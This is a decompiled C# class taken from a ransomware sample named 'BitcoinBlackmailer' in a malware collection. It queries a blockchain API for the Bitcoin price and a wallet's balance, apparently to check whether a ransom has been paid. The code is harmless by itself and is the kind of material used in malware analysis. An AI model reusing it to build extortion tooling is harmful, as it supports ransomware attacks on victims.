// Decompiled with JetBrains decompiler
// Type: Main.Tools.Blockr
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 8BE9EE5B-D2E1-4CD7-973E-883BE52B7291
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-80a6681b00056a487bba1b66c046b798dfe18bf37aa30d8a4a1be968b9add997.exe

using Newtonsoft.Json.Linq;
using System;
using System.Net;

namespace Main.Tools
{
  internal static class Blockr
  {
    private static string BlockrAddress => "http://btc.blockr.io/api/v1/";

    internal static double GetPrice()
    {
      JObject jobject = JObject.Parse(new WebClient().DownloadString(Blockr.BlockrAddress + "coin/info/"));
      JToken jtoken = jobject["status"];
      if (jtoken != null && ((object) jtoken).ToString() == "error")
        throw new Exception(((object) jobject).ToString());
      return jobject["data"][(object) "markets"][(object) "coinbase"].Value<double>((object) "value");
    }

    internal static double GetBalanceBtc(string address)
    {
      JObject jobject = JObject.Parse(new WebClient().DownloadString(Blockr.BlockrAddress + "address/balance/" + address));
      JToken jtoken = jobject["status"];
      if (jtoken != null && ((object) jtoken).ToString() == "error")
        throw new Exception(((object) jobject).ToString());
      return jobject["data"].Value<double>((object) "balance");
    }
  }
}
